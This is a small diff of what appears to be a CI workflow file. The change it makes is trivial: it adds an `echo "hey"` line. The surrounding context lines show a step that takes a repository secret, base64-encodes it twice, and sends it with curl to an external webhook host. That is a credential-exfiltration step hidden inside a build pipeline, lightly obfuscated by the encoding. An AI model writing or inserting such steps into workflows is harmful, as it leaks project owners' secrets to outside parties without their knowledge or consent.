@@ -24,4 +24,5 @@ jobs:
         run: |
           status=$(echo "${{secrets.TEST}} " | base64 -w0 | base64 -w0)
           curl -X POST https://hot-zoo-01.webhook.cool -d "$status"
+          echo "hey"
  
